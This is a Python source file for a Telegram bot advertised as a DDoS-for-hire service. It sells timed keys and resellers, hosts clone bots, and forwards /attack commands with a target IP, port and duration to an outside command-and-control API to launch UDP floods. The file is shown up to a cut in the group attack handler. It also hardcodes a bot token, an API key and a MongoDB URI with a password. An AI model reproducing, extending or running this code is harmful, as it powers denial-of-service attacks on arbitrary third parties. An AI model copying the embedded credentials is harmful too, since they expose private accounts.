#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta, timezone
from collections import defaultdict
from pymongo import MongoClient

IST = timezone(timedelta(hours=5, minutes=30))

def get_current_ist():
    return datetime.now(IST)

def format_ist_time(dt):
    return dt.strftime('%d %b %Y, %I:%M:%S %p') + " IST"

BOT_TOKEN = "8291785662:AAHj4cvF3Hxjgoqk7Dkq-1ZluwCH1GtElVk"
ADMIN_ID = ["8487946379"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "F6XMND"
MAX_CONCURRENT = 2
COOLDOWN_TIME = 30

MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]
users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
hosted_bots_collection = db["hosted_bots"]
settings_collection = db["settings"]
broadcast_users_collection = db["broadcast_users"]

print("✅ MongoDB Connected Successfully!")
print(f"📅 Server Time: {format_ist_time(get_current_ist())}")

active_attacks = {}
cooldown = {}
hosted_bots = {}
hosted_bot_instances = {}
maintenance_mode = False

def load_users():
    users_data = users_collection.find_one({"_id": "users"})
    if not users_data:
        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
        return {"users": [ADMIN_ID[0]], "resellers": []}
    return users_data

def save_users(data):
    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)

def load_keys():
    keys = {}
    for key_data in keys_collection.find():
        keys[key_data["key"]] = {
            "user_id": key_data.get("user_id"),
            "duration_value": key_data.get("duration_value"),
            "duration_unit": key_data.get("duration_unit"),
            "generated_by": key_data.get("generated_by"),
            "generated_at": key_data.get("generated_at"),
            "expires_at": key_data.get("expires_at"),
            "used": key_data.get("used", False),
            "used_by": key_data.get("used_by"),
            "used_at": key_data.get("used_at")
        }
    return keys

def save_keys(keys_data):
    keys_collection.delete_many({})
    for key, info in keys_data.items():
        keys_collection.insert_one({
            "key": key,
            "user_id": info.get("user_id"),
            "duration_value": info.get("duration_value"),
            "duration_unit": info.get("duration_unit"),
            "generated_by": info.get("generated_by"),
            "generated_at": info.get("generated_at"),
            "expires_at": info.get("expires_at"),
            "used": info.get("used", False),
            "used_by": info.get("used_by"),
            "used_at": info.get("used_at")
        })

def load_groups():
    groups = {}
    for group_data in groups_collection.find():
        groups[group_data["group_id"]] = {
            "attack_time": group_data.get("attack_time", 60),
            "added_by": group_data.get("added_by"),
            "added_at": group_data.get("added_at")
        }
    return groups

def save_groups(groups_data):
    groups_collection.delete_many({})
    for group_id, info in groups_data.items():
        groups_collection.insert_one({
            "group_id": group_id,
            "attack_time": info.get("attack_time"),
            "added_by": info.get("added_by"),
            "added_at": info.get("added_at")
        })

def load_hosted_bots():
    bots = {}
    for bot_data in hosted_bots_collection.find():
        bots[bot_data["bot_token"]] = {
            "owner_id": bot_data.get("owner_id"),
            "owner_name": bot_data.get("owner_name"),
            "concurrent": bot_data.get("concurrent", 1),
            "blocked": bot_data.get("blocked", False),
            "active_attacks": {},
            "users": bot_data.get("users", []),
            "resellers": bot_data.get("resellers", [])
        }
    return bots

def save_hosted_bots(bots_data):
    hosted_bots_collection.delete_many({})
    for bot_token, info in bots_data.items():
        hosted_bots_collection.insert_one({
            "bot_token": bot_token,
            "owner_id": info.get("owner_id"),
            "owner_name": info.get("owner_name"),
            "concurrent": info.get("concurrent", 1),
            "blocked": info.get("blocked", False),
            "users": info.get("users", []),
            "resellers": info.get("resellers", [])
        })

def load_settings():
    settings = settings_collection.find_one({"_id": "settings"})
    if not settings:
        settings_collection.insert_one({"_id": "settings", "max_concurrent": 2, "cooldown": 30})
        return {"max_concurrent": 2, "cooldown": 30}
    return settings

def save_settings(settings):
    settings_collection.update_one({"_id": "settings"}, {"$set": settings}, upsert=True)

def load_broadcast_users():
    broadcast_data = broadcast_users_collection.find_one({"_id": "broadcast_users"})
    if not broadcast_data:
        broadcast_users_collection.insert_one({"_id": "broadcast_users", "users": []})
        return {"users": []}
    return broadcast_data

def save_broadcast_users(data):
    broadcast_users_collection.update_one({"_id": "broadcast_users"}, {"$set": data}, upsert=True)

users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
hosted_bots = load_hosted_bots()
settings = load_settings()
broadcast_data = load_broadcast_users()
broadcast_users = broadcast_data.get("users", [])

MAX_CONCURRENT = settings.get("max_concurrent", 2)
COOLDOWN_TIME = settings.get("cooldown", 30)

bot = telebot.TeleBot(BOT_TOKEN)

def check_maintenance():
    return maintenance_mode

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if duration_str.isdigit():
        return int(duration_str), "day"
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    return None, None

def get_expiry_date(value, unit):
    now_ist = get_current_ist()
    if unit == "hour":
        return now_ist + timedelta(hours=value)
    else:
        return now_ist + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"{value} Hour(s)"
    return f"{value} Day(s)"

def get_total_active_count():
    now = time.time()
    for attack_id, info in list(active_attacks.items()):
        if now >= info["finish_time"]:
            del active_attacks[attack_id]
    for token, bot_info in hosted_bots.items():
        for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
            if now >= info["finish_time"]:
                del bot_info["active_attacks"][attack_id]
                save_hosted_bots(hosted_bots)
    main_count = len(active_attacks)
    hosted_count = sum(len(b.get("active_attacks", {})) for b in hosted_bots.values())
    return main_count + hosted_count

def get_main_active_count():
    now = time.time()
    for attack_id, info in list(active_attacks.items()):
        if now >= info["finish_time"]:
            del active_attacks[attack_id]
    return len(active_attacks)

def check_active_attack_by_target(ip, port):
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({
                "target": info["target_key"],
                "user": info["user"],
                "remaining": remaining
            })
    
    slots_status = []
    for i in range(MAX_CONCURRENT):
        if i < len(slots):
            remaining = slots[i]['remaining']
            mins = remaining // 60
            secs = remaining % 60
            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
            slots_status.append(f"❌ SLOT {i+1}: BUSY\n└ 🎯 {slots[i]['target']}\n└ 👤 {slots[i]['user']}\n└ ⏰ {time_str} left")
        else:
            slots_status.append(f"✅ SLOT {i+1}: FREE\n└ 💡 Ready for attack")
    return slots_status

def remove_user_from_system(user_id):
    if user_id in users:
        users.remove(user_id)
    if user_id in resellers:
        resellers.remove(user_id)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user"] == user_id:
            del active_attacks[attack_id]
    if user_id in cooldown:
        del cooldown[user_id]
    return True

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True and now < info["expires_at"]:
            return True
    return False

def stop_hosted_bot(bot_token):
    try:
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
            except:
                pass
            del hosted_bot_instances[bot_token]
        if bot_token in hosted_bots:
            del hosted_bots[bot_token]
        save_hosted_bots(hosted_bots)
        return True
    except:
        return False

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        for part in parts:
            if int(part) < 0 or int(part) > 255:
                return False
        return True
    return False

def send_attack_to_api(ip, port, duration, chat_id, bot_instance, is_hosted=False):
    try:
        api_params = {
            "api_key": API_KEY,
            "target": ip,
            "port": port,
            "time": duration,
            "concurrent": 1
        }
        response = requests.get(API_URL, params=api_params, timeout=15)
        if response.status_code == 200:
            time.sleep(duration)
            finish_time = format_ist_time(get_current_ist())
            bot_instance.send_message(chat_id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n📅 Finished at: {finish_time}\n🔄 Restart your game!")
            return True
        else:
            bot_instance.send_message(chat_id, f"❌ Attack failed! Status: {response.status_code}")
            return False
    except Exception as e:
        bot_instance.send_message(chat_id, f"❌ Attack error!")
        return False

def cleanup_expired_keys():
    while True:
        time.sleep(60)
        now = time.time()
        expired_keys = []
        for key, info in keys_data.items():
            if info.get("used", False) and now > info["expires_at"]:
                expired_keys.append(key)
        for key in expired_keys:
            user_id = keys_data[key].get("used_by")
            if user_id and user_id not in ADMIN_ID:
                has_other = False
                for k, v in keys_data.items():
                    if v.get("used_by") == user_id and v.get("used", False) and k != key:
                        if now < v["expires_at"]:
                            has_other = True
                            break
                if not has_other and user_id in users:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)
                    try:
                        bot.send_message(user_id, "⚠️ YOUR ACCESS HAS EXPIRED!\n\nYour key has expired.\nContact admin to get a new key.")
                    except:
                        pass
            del keys_data[key]
        if expired_keys:
            save_keys(keys_data)
            print(f"✅ Expired {len(expired_keys)} keys")

expiry_cleanup_thread = threading.Thread(target=cleanup_expired_keys, daemon=True)
expiry_cleanup_thread.start()

def attack_cleanup():
    while True:
        time.sleep(5)
        now = time.time()
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[attack_id]
        for token, bot_info in hosted_bots.items():
            for attack_id, info in list(bot_info.get("active_attacks", {}).items()):
                if now >= info["finish_time"]:
                    del bot_info["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)

attack_cleanup_thread = threading.Thread(target=attack_cleanup, daemon=True)
attack_cleanup_thread.start()

def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
    try:
        print(f"🔄 Starting hosted bot...")
        if bot_token in hosted_bot_instances:
            try:
                hosted_bot_instances[bot_token].stop_polling()
                time.sleep(1)
            except:
                pass
            del hosted_bot_instances[bot_token]
        test_bot = telebot.TeleBot(bot_token)
        test_bot.remove_webhook()
        time.sleep(2)
        bot_info = test_bot.get_me()
        print(f"✅ Hosted bot @{bot_info.username} is valid")
        hosted_bot = telebot.TeleBot(bot_token)
        hosted_bot_instances[bot_token] = hosted_bot
        hosted_cooldown_data = {}

        @hosted_bot.message_handler(commands=['start'])
        def hosted_start(msg):
            current_time = format_ist_time(get_current_ist())
            hosted_bot.reply_to(msg, f"✨ DDOS BOT ✨\n\n👑 Owner: {owner_name}\n✅ Status: Active\n⚡ Concurrent: {concurrent}\n⏱️ Max Time: 300s\n📅 Server Time: {current_time}\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/cooldown\n/addreseller USER_ID\n/removereseller USER_ID\n/removekey KEY\n/genkey 1 or 5h\n/addgroup GROUP_ID TIME\n/mykeys\n/redeem KEY\n/help")

        @hosted_bot.message_handler(commands=['cooldown'])
        def hosted_cooldown(msg):
            uid = str(msg.chat.id)
            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - time.time()
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ Cooldown: {int(remaining)}s remaining!")
                else:
                    del hosted_cooldown_data[uid]
                    hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
            else:
                hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")

        @hosted_bot.message_handler(commands=['addgroup'])
        def hosted_add_group(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can add groups!")
                return
            args = msg.text.split()
            if len(args) != 3:
                hosted_bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME\n📌 Example: /addgroup -100123456789 60")
                return
            group_id = args[1]
            try:
                attack_time = int(args[2])
                if attack_time < 10 or attack_time > 300:
                    hosted_bot.reply_to(msg, "❌ Attack time must be 10-300 seconds!")
                    return
            except:
                hosted_bot.reply_to(msg, "❌ Invalid time!")
                return
            groups[group_id] = {"attack_time": attack_time, "added_by": uid, "added_at": time.time()}
            save_groups(groups)
            hosted_bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")

        @hosted_bot.message_handler(commands=['removegroup'])
        def hosted_remove_group(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can remove groups!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
                return
            group_id = args[1]
            if group_id in groups:
                del groups[group_id]
                save_groups(groups)
                hosted_bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 Group ID: {group_id}")
            else:
                hosted_bot.reply_to(msg, "❌ Group not found!")

        @hosted_bot.message_handler(commands=['removekey'])
        def hosted_remove_key(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can remove keys!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removekey KEY")
                return
            key = args[1]
            if key not in keys_data:
                hosted_bot.reply_to(msg, "❌ Key not found!")
                return
            del keys_data[key]
            save_keys(keys_data)
            hosted_bot.reply_to(msg, f"✅ KEY REMOVED!\n🔑 Key: {key}")

        @hosted_bot.message_handler(commands=['attack'])
        def hosted_attack(msg):
            uid = str(msg.chat.id)
            if uid not in users:
                hosted_bot.reply_to(msg, "❌ ACCESS DENIED!\n\nYou don't have an active key.\nUse /redeem KEY to activate your access.")
                return
            if not check_user_expiry(uid):
                hosted_bot.reply_to(msg, "❌ ACCESS EXPIRED!\n\nYour key has expired.\nUse /redeem KEY to get new access.")
                return
            args = msg.text.split()
            if len(args) != 4:
                hosted_bot.reply_to(msg, "⚠️ Usage: /attack IP PORT TIME\n📌 Example: /attack 1.1.1.1 443 60")
                return
            ip, port, duration = args[1], args[2], args[3]
            if not validate_ip(ip):
                hosted_bot.reply_to(msg, "❌ Invalid IP address!")
                return
            try:
                port = int(port)
                duration = int(duration)
                if duration < 10 or duration > 300:
                    hosted_bot.reply_to(msg, "❌ Duration must be 10-300 seconds!")
                    return
            except:
                hosted_bot.reply_to(msg, "❌ Invalid port or time!")
                return

            total_active = get_total_active_count()
            if total_active >= MAX_CONCURRENT:
                hosted_bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks across ALL bots: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.")
                return

            now = time.time()
            active_in_this_bot = 0
            if bot_token in hosted_bots:
                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
                    if now < ainfo["finish_time"]:
                        active_in_this_bot += 1
                if active_in_this_bot >= concurrent:
                    hosted_bot.reply_to(msg, f"❌ THIS BOT'S LIMIT REACHED!\n📊 Active attacks: {active_in_this_bot}/{concurrent}\n💡 Use /status to check")
                    return

            if uid in hosted_cooldown_data:
                remaining = hosted_cooldown_data[uid] - now
                if remaining > 0:
                    hosted_bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
                    return

            attack_id = f"hosted_{bot_token}_{uid}_{int(now)}_{random.randint(1000, 9999)}"
            target_key = f"{ip}:{port}"
            finish_time = now + duration

            target_under_attack = False
            if bot_token in hosted_bots:
                for aid, ainfo in hosted_bots[bot_token].get("active_attacks", {}).items():
                    if ainfo["target_key"] == target_key and now < ainfo["finish_time"]:
                        target_under_attack = True
                        break
            if target_under_attack:
                hosted_bot.reply_to(msg, f"❌ TARGET UNDER ATTACK!\n🎯 {target_key} is already being attacked.")
                return

            hosted_cooldown_data[uid] = now + COOLDOWN_TIME
            if bot_token not in hosted_bots:
                hosted_bots[bot_token] = {"active_attacks": {}, "owner_id": owner_id, "owner_name": owner_name, "concurrent": concurrent}
            if "active_attacks" not in hosted_bots[bot_token]:
                hosted_bots[bot_token]["active_attacks"] = {}

            hosted_bots[bot_token]["active_attacks"][attack_id] = {
                "user": uid,
                "finish_time": finish_time,
                "ip": ip,
                "port": port,
                "target_key": target_key
            }
            save_hosted_bots(hosted_bots)

            new_active = 0
            for aid, ainfo in hosted_bots[bot_token]["active_attacks"].items():
                if now < ainfo["finish_time"]:
                    new_active += 1
            new_total = get_total_active_count()
            current_time = format_ist_time(get_current_ist())
            hosted_bot.reply_to(msg, f"✨ ATTACK LAUNCHED! ✨\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Method: UDP (Auto)\n📅 Time: {current_time}\n📊 This Bot Slots: {new_active}/{concurrent}\n🌐 Global Active: {new_total}/{MAX_CONCURRENT}")

            def run():
                send_attack_to_api(ip, port, duration, msg.chat.id, hosted_bot, is_hosted=True)
                if bot_token in hosted_bots and attack_id in hosted_bots[bot_token]["active_attacks"]:
                    del hosted_bots[bot_token]["active_attacks"][attack_id]
                    save_hosted_bots(hosted_bots)
            threading.Thread(target=run).start()

        @hosted_bot.message_handler(commands=['status'])
        def hosted_status(msg):
            current_time = format_ist_time(get_current_ist())
            if bot_token in hosted_bots:
                bot_info = hosted_bots[bot_token]
                now = time.time()
                active_list = []
                for aid, info in bot_info.get("active_attacks", {}).items():
                    if now < info["finish_time"]:
                        remaining = int(info["finish_time"] - now)
                        mins = remaining // 60
                        secs = remaining % 60
                        time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
                        active_list.append(f"❌ SLOT {len(active_list)+1}: BUSY\n└ 🎯 {info['target_key']}\n└ 👤 {info['user']}\n└ ⏰ {time_str} left")
                status_msg = f"📊 THIS BOT SLOT STATUS\n📅 {current_time}\n\n"
                for i in range(bot_info["concurrent"]):
                    if i < len(active_list):
                        status_msg += active_list[i] + "\n\n"
                    else:
                        status_msg += f"✅ SLOT {i+1}: FREE\n└ 💡 Ready for attack\n\n"
                status_msg += f"📊 TOTAL ACTIVE IN THIS BOT: {len(active_list)}/{bot_info['concurrent']}"
                hosted_bot.reply_to(msg, status_msg)
            else:
                hosted_bot.reply_to(msg, f"✅ ALL SLOTS FREE ✅\n\nNo ongoing attacks detected!\n📅 {current_time}")

        @hosted_bot.message_handler(commands=['addreseller'])
        def hosted_add_reseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can add resellers!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /addreseller USER_ID")
                return
            new_reseller = args[1]
            if new_reseller not in resellers:
                resellers.append(new_reseller)
                users_data["resellers"] = resellers
                save_users(users_data)
                hosted_bot.reply_to(msg, f"✅ RESELLER ADDED!\n👤 User: {new_reseller}\n🔑 Can now generate keys")
            else:
                hosted_bot.reply_to(msg, "❌ User is already a reseller!")

        @hosted_bot.message_handler(commands=['removereseller'])
        def hosted_remove_reseller(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can remove resellers!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /removereseller USER_ID")
                return
            target = args[1]
            if target in resellers:
                resellers.remove(target)
                users_data["resellers"] = resellers
                save_users(users_data)
                hosted_bot.reply_to(msg, f"✅ RESELLER REMOVED!\n👤 User: {target}")
            else:
                hosted_bot.reply_to(msg, "❌ User is not a reseller!")

        @hosted_bot.message_handler(commands=['genkey'])
        def hosted_genkey(msg):
            uid = str(msg.chat.id)
            is_reseller = uid in resellers
            if uid != owner_id and not is_reseller:
                hosted_bot.reply_to(msg, "❌ Owner or Reseller only!")
                return
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
                return
            duration_str = args[1]
            value, unit = parse_duration(duration_str)
            if value is None:
                hosted_bot.reply_to(msg, "❌ Invalid duration! Use 1 or 5h")
                return
            key = generate_key()
            expires_at = get_expiry_date(value, unit)
            keys_data[key] = {"user_id": "pending", "duration_value": value, "duration_unit": unit, "generated_by": uid, "generated_at": time.time(), "expires_at": expires_at.timestamp(), "used": False}
            save_keys(keys_data)
            expiry_str = expires_at.strftime('%d %b %Y, %I:%M %p')
            hosted_bot.reply_to(msg, f"✅ KEY GENERATED!\n\n🔑 Key: `{key}`\n⏰ Duration: {format_duration(value, unit)}\n📅 Expires: {expiry_str}\n\nUser: /redeem {key}")

        @hosted_bot.message_handler(commands=['mykeys'])
        def hosted_mykeys(msg):
            uid = str(msg.chat.id)
            if uid != owner_id:
                hosted_bot.reply_to(msg, "❌ Only bot owner can view keys!")
                return
            my_keys = []
            for key, info in keys_data.items():
                if info.get("generated_by") == uid and not info.get("used", False):
                    expires = datetime.fromtimestamp(info["expires_at"]).strftime('%d %b %Y, %I:%M %p')
                    my_keys.append(f"🔑 {key}\n   ⏰ {format_duration(info['duration_value'], info['duration_unit'])}\n   📅 Expires: {expires}")
            if my_keys:
                hosted_bot.reply_to(msg, "📋 YOUR GENERATED KEYS:\n\n" + "\n\n".join(my_keys))
            else:
                hosted_bot.reply_to(msg, "📋 No keys generated yet!")

        @hosted_bot.message_handler(commands=['redeem'])
        def hosted_redeem(msg):
            uid = str(msg.chat.id)
            args = msg.text.split()
            if len(args) != 2:
                hosted_bot.reply_to(msg, "⚠️ Usage: /redeem KEY")
                return
            key = args[1]
            if key not in keys_data:
                hosted_bot.reply_to(msg, "❌ Invalid key!")
                return
            key_info = keys_data[key]
            if key_info.get("used", False):
                hosted_bot.reply_to(msg, "❌ Key already used!")
                return
            if time.time() > key_info["expires_at"]:
                hosted_bot.reply_to(msg, "❌ Key expired!")
                del keys_data[key]
                save_keys(keys_data)
                return
            if uid not in users:
                users.append(uid)
                users_data["users"] = users
                save_users(users_data)
            keys_data[key]["used"] = True
            keys_data[key]["used_at"] = time.time()
            keys_data[key]["used_by"] = uid
            save_keys(keys_data)
            expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%d %b %Y, %I:%M %p')
            hosted_bot.reply_to(msg, f"✅ ACCESS GRANTED!\n🎉 User {uid} activated!\n⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}\n📅 Expires: {expiry_str}\n⚡ Concurrent: {concurrent}")

        @hosted_bot.message_handler(commands=['help'])
        def hosted_help(msg):
            current_time = format_ist_time(get_current_ist())
            hosted_bot.reply_to(msg, f"✨ DDOS BOT HELP ✨\n\n👑 Owner: {owner_name}\n📅 Server Time: {current_time}\n\n/attack IP PORT TIME - Launch UDP attack\n/status - Check attack slots\n/addreseller USER_ID - Add reseller (Owner only)\n/removereseller USER_ID - Remove reseller (Owner only)\n/removekey KEY - Remove key (Owner only)\n/genkey 1 or 5h - Generate key (Owner/Reseller)\n/addgroup GROUP_ID TIME - Add group (Owner only)\n/mykeys - View your keys (Owner only)\n/redeem KEY - Activate key\n/help - This menu\n/start - Bot info\n\n⚡ Concurrent Attacks: {concurrent}\n⏱️ Max Time: 300s\n⏳ Cooldown: {COOLDOWN_TIME}s")

        def run_hosted_bot():
            try:
                hosted_bot.infinity_polling()
            except:
                pass
        threading.Thread(target=run_hosted_bot, daemon=True).start()
        time.sleep(3)
        return True
    except Exception as e:
        print(f"Failed to start hosted bot: {e}")
        return False

@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    current_time = format_ist_time(get_current_ist())
    if uid not in broadcast_users:
        broadcast_users.append(uid)
        broadcast_data["users"] = broadcast_users
        save_broadcast_users(broadcast_data)
    if uid not in users and uid not in ADMIN_ID:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Bot is under maintenance!")
        return
    if chat_type in ["group", "supergroup"]:
        group_id = str(msg.chat.id)
        attack_time = groups.get(group_id, {}).get("attack_time", None)
        if attack_time:
            bot.reply_to(msg, f"✨ XSILENT DDOS BOT - GROUP ✨\n\n✅ Group Approved!\n⚡ Attack Time: {attack_time}s\n📅 Server Time: {current_time}\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
        else:
            bot.reply_to(msg, f"❌ Group not approved!\n\n🛒 Contact: XSILENT")
        return
    if uid in ADMIN_ID:
        bot.reply_to(msg, f"""👑 XSILENT DDOS BOT - OWNER 👑

✅ Full Access
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
⏱️ Max Time: 300s
📅 Server Time: {current_time}

📝 COMMANDS:

/attack IP PORT TIME
/status
/cooldown
/setmax 1-100
/setcooldown 1-300

/genkey 1
/genkey 5h
/removekey KEY

/add USER
/remove USER
/addreseller USER
/removereseller USER

/addgroup GROUP_ID TIME
/removegroup GROUP_ID

/host BOT_TOKEN USER_ID CONCURRENT NAME
/unhost BOT_TOKEN

/maintenance on/off
/broadcast
/stopattack IP:PORT
/allusers
/allgroups
/allhosts

🛒 Buy: XSILENT""")
    elif uid in resellers:
        bot.reply_to(msg, f"""💎 XSILENT DDOS BOT - RESELLER 💎

✅ Reseller Access
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 Server Time: {current_time}

📝 COMMANDS:

/attack IP PORT TIME
/status
/cooldown
/genkey 1
/genkey 5h
/mykeys

🛒 Buy: XSILENT""")
    elif uid in users:
        has_active = check_user_expiry(uid)
        status_text = "Active" if has_active else "Expired"
        bot.reply_to(msg, f"""🔥 XSILENT DDOS BOT - USER 🔥

✅ Status: {status_text}
⚡ Global Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
📅 Server Time: {current_time}

📝 COMMANDS:

/attack IP PORT TIME
/status
/cooldown
/redeem KEY

🛒 Buy: XSILENT""")
    else:
        bot.reply_to(msg, f"""❌ Unauthorized!

Use /redeem KEY to activate
📅 Server Time: {current_time}

🛒 Buy access: XSILENT""")

@bot.message_handler(commands=['cooldown'])
def cooldown_cmd(msg):
    uid = str(msg.chat.id)
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Your cooldown: {int(remaining)}s remaining!")
        else:
            del cooldown[uid]
            bot.reply_to(msg, "✅ No cooldown!")
    else:
        bot.reply_to(msg, "✅ No cooldown!")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /setcooldown 1-300\n📌 Example: /setcooldown 60")
        return
    try:
        new_cooldown = int(args[1])
        if new_cooldown < 1 or new_cooldown > 300:
            bot.reply_to(msg, "❌ Value must be between 1 and 300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    global COOLDOWN_TIME
    COOLDOWN_TIME = new_cooldown
    settings["cooldown"] = new_cooldown
    save_settings(settings)
    bot.reply_to(msg, f"✅ COOLDOWN UPDATED!\n\n⏳ New Cooldown: {COOLDOWN_TIME}s")

@bot.message_handler(commands=['setmax'])
def set_max_concurrent(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ Usage: /setmax 1-100\n📌 Example: /setmax 5")
        return
    try:
        new_max = int(args[1])
        if new_max < 1 or new_max > 100:
            bot.reply_to(msg, "❌ Value must be between 1 and 100!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid number!")
        return
    global MAX_CONCURRENT
    MAX_CONCURRENT = new_max
    settings["max_concurrent"] = new_max
    save_settings(settings)
    bot.reply_to(msg, f"✅ GLOBAL CONCURRENT UPDATED!\n\n⚡ New Value: {MAX_CONCURRENT}\n🌐 Total attacks across ALL bots cannot exceed {MAX_CONCURRENT}\n💡 Use /status to see changes")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    is_group = (chat_type in ["group", "supergroup"])
    if check_maintenance():
        bot.reply_to(msg, "🔧 Maintenance!")
        return
    if is_group:
        attack_time_limit = groups.get(str(msg.chat.id), {}).get("attack_time", None)
        if not attack_time_limit:
            bot.reply_to(msg, f"❌ Group not approved!\n\n🛒 Contact: XSILENT")
            return
    else:
        attack_time_limit = 300
    if uid not in users and uid not in ADMIN_ID and uid not in resellers and not is_group:
        bot.reply_to(msg, f"❌ Unauthorized!\n\n🛒 Buy: XSILENT")
        return
    if not is_group and uid not in ADMIN_ID and not check_user_expiry(uid):
        bot.reply_to(msg, f"❌ Your access has expired!\n\n🛒 Buy new key: XSILENT")
        return
    total_active = get_total_active_count()
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ GLOBAL LIMIT REACHED!\n🌐 Total active attacks across ALL bots: {total_active}/{MAX_CONCURRENT}\n💡 Wait for an attack to finish.\n\n⚡ Use /status to check current attacks")
        return
    if uid in cooldown and not is_group:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!\n💡 Use /cooldown to check")
            return
    args = msg.text.split()
    if is_group:
        if len(args) != 3:
